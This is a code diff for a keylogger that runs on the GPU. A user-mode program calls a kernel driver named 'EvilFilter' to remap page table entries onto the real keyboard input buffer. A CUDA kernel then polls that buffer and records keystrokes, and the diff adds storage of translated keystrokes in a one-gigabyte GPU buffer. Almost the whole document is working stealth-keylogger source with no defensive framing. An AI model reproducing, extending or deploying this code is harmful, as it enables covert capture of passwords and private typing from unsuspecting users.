@@ -18,64 +18,37 @@
 #include <process.h>
 #include <psapi.h>
 
-// define DEBUG to see evidence of keystrokes being logged by the
-// GPU, via printf()s emitted by the CUDA kernel 
-
 #define DEBUG 1
 
-__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData) { // , PCHAR KeyMap
-	USHORT lastFlag = 0;
-	while (TRUE) {
-		if (lastFlag != keyboardData->Flags) { // keyboardData->MakeCode != 0
-			printf(" %s SC:[0x%x] [c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]", // [%c]
-				keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
-				keyboardData->MakeCode,
-//				KeyMap[keyboardData->MakeCode],
-				keyboardData->UnitId,
-				keyboardData->Flags,
-				keyboardData->Reserved,
-				keyboardData->ExtraInformation);
-			printf(" raw:");
-			PCHAR p = (PCHAR)keyboardData;
-			for (int i = 0; i < 12; i++) {
-				printf("[0x%x]", p[i]);
+__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer) { // , PCHAR KeyMap
+	USHORT lastMakeCode = 0;
+	ULONG bufferPosition = 0;
+	int index = blockIdx.x*blockDim.x + threadIdx.x;
+	if (index == 0) {
+		while (TRUE) {
+			if (lastMakeCode != keyboardData->MakeCode) { // keyboardData->MakeCode != 0
+				cudaBuffer[bufferPosition++] = KeyMap[keyboardData->MakeCode];
+#ifdef DEBUG
+				printf(" %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]",
+					keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
+					keyboardData->MakeCode,
+					KeyMap[keyboardData->MakeCode],
+					keyboardData->UnitId,
+					keyboardData->Flags,
+					keyboardData->Reserved,
+					keyboardData->ExtraInformation);
+				printf(" raw:");
+				PCHAR p = (PCHAR)keyboardData;
+				for (int i = 0; i < 12; i++) {
+					printf("[0x%x]", p[i]);
 
+				}
+				printf("\n");
+#endif
+				lastMakeCode = keyboardData->MakeCode;
 			}
-			printf("\n");
-			lastFlag = keyboardData->Flags;
 		}
 	}
-}
-
-__global__ void l(unsigned char *v,
-	unsigned char *ks,
-	unsigned long *ki,
-	unsigned char *p0,
-	unsigned char *p2) {
-
-
-
-
-}
-
-VOID WaitAMinute() {
-	printf("Waiting a minute...");
-	SYSTEMTIME systemTime;
-	GetSystemTime(&systemTime);
-	WORD CurrentMinute = systemTime.wMinute;
-	WORD ExitMinute;
-	if (systemTime.wSecond > 30) {
-		ExitMinute = systemTime.wMinute + 2;
-	}
-	else {
-		ExitMinute = systemTime.wMinute + 1;
-	}
-	//while (FALSE) {
-	while (CurrentMinute != ExitMinute) {
-		GetSystemTime(&systemTime);
-		CurrentMinute = systemTime.wMinute;
-	}
-	printf("done waiting\n");
 }
 
 /**
@@ -93,13 +66,7 @@ int main(int argc, _TCHAR* argv[]) {
 	HANDLE hControlDevice;
 	ULONG  bytes;
 
-	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"),
-		GENERIC_READ | GENERIC_WRITE,
-		FILE_SHARE_READ | FILE_SHARE_WRITE, //0, // FILE_SHARE_READ | FILE_SHARE_WRITE
-		NULL, // no SECURITY_ATTRIBUTES structure
-		OPEN_EXISTING, // No special create flags
-		0, //  No special attributes
-		NULL); // No template file
+	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 
 	if (INVALID_HANDLE_VALUE == hControlDevice) {
 		printf("Failed to open EvilFilter device\n");
@@ -109,24 +76,14 @@ int main(int argc, _TCHAR* argv[]) {
 		PKEYBOARD_INPUT_DATA keyboardData;
 		PKEYBOARD_INPUT_DATA cudaKeyboardData;
 		PSHARED_MEMORY_STRUCT dataToTransmit;
-		//OVERLAPPED      DeviceIoOverlapped;
 
 		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
 		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);
 		dataToTransmit->instruction = 'O';
 		dataToTransmit->offset = 0;
 
-		//DeviceIoOverlapped.Offset = 0;
-		//DeviceIoOverlapped.OffsetHigh = 0;
-		//DeviceIoOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
-
-		if (!DeviceIoControl(hControlDevice,
-			IOCTL_CUSTOM_CODE,
-			NULL, 0,
-			dataToTransmit, SharedMemoryLength,
-			&bytes, 
-			NULL //&DeviceIoOverlapped
-			)) {
+		// Get the Buffer Offset
+		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
 			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
 		}
 		else {
@@ -141,6 +98,8 @@ int main(int argc, _TCHAR* argv[]) {
 			printf("Ioctl to EvilFilter device succeeded...offsets are [0x%lx] [0x%lx]\n", kmdfOffset, keyboardOffset);
 			keyboardOffset = (ULONG)keyboardData & 0x0fff;
 			printf("keyboardData is [0x%lx] offset is [0x%lx].\n", keyboardData, keyboardOffset);
+
+			// create a pointer with the correct offset
 			listNode = (PLLIST)malloc(sizeof(LLIST));
 			listNode->keyboardBuffer = keyboardData;
 			listNode->previous = NULL;
@@ -171,16 +130,14 @@ int main(int argc, _TCHAR* argv[]) {
 			dataToTransmit->PageTable = ppte;
 			dataToTransmit->instruction = 'E';
 
-			if (!DeviceIoControl(hControlDevice,
-				IOCTL_CUSTOM_CODE,
-				NULL, 0,
-				dataToTransmit, SharedMemoryLength,
-				&bytes, 
-				NULL // &DeviceIoOverlapped
-				)) {
+			// Get the Keyboard Buffer
+			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL )) {
 				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
 			}
 			else {
+				PCHAR cudaKeyMap;
+				PCHAR cudaBuffer;
+
 				printf("Ioctl to EvilFilter device succeeded \n");
 				printf("keyboardData=[0x%lx]\n", keyboardData);
 				printf(" we now have the real keyboard buffer!!!\n");
@@ -189,15 +146,23 @@ int main(int argc, _TCHAR* argv[]) {
 				checkCudaErrors(cudaSetDevice(0));
 				checkCudaErrors(cudaSetDeviceFlags(cudaDeviceMapHost));
 
-				printf("Registering...");
+
+				printf("Allocating cudaKeyMap...\n");
+				checkCudaErrors(cudaMalloc(&cudaBuffer, 1000000000));
+				printf("Allocating cudaKeyMap...\n");
+				checkCudaErrors(cudaMalloc((void **)&cudaKeyMap, sizeof(char) * 84));
+				printf("Copying KeyMap to cudaKeyMap...");
+				checkCudaErrors(cudaMemcpy(cudaKeyMap, KeyMap, 84 * sizeof(char), cudaMemcpyHostToDevice));	printf("coppied.\n");
+
+				printf("Registering KeyboardData for use by CUDA...\n");
 				checkCudaErrors(cudaHostRegister(keyboardData, 10 * sizeof(char), cudaHostRegisterMapped));
-				printf("getting device pointer...");
+				printf("getting device pointer for KeyboardData...\n");
 				checkCudaErrors(cudaHostGetDevicePointer((void **)&cudaKeyboardData, (void *)keyboardData, 0));
 
 				printf("Launching CUDA process...");
 				dim3 grid(1);
 				dim3 block(1); 
-				logKeyboardData <<<grid, block >>>(cudaKeyboardData);
+				logKeyboardData <<<grid, block >>>(cudaKeyboardData, cudaKeyMap, cudaBuffer);
 				checkCudaErrors(cudaDeviceSynchronize());
 				printf("Launched.\n");
 			}
@@ -239,30 +204,4 @@ PVOID GetPteAddress(PVOID virtualaddr) {
 		return NULL;
 	}
 }
-
-
-/*
-// for testing keystroke detection in userspace--move after
-// remap of PTE by kernel driver to test
-while (strokes < 100) {
-stroke=0;
-for (k=0; k < 8 && ! stroke; k++) {
-stroke = (((char *)v)[k]);
-}
-if (stroke) {
-strokes++;
-for (k=0; k < 8; k++) {
-printf("HOST: %d %d %d %d %d %d %d %d\n",
-v[0],
-v[1],
-v[2],
-v[3],
-v[4],
-v[5],
-v[6],
-v[7]);
-}
-}
-}
-*/
 
